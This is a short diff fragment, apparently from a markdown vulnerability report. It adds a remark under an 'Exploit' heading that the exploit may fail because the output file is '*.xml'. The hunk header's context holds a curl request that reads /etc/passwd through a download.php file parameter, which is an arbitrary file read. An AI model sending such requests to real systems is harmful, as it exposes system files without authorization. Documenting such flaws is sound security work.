@@ -148,5 +148,6 @@ curl http://localhost/admin/download.php?file=/etc/passwd
 > Exploit
 
 ```
+Maybe it can not work, because of the output filename is '*.xml'
 ```
 
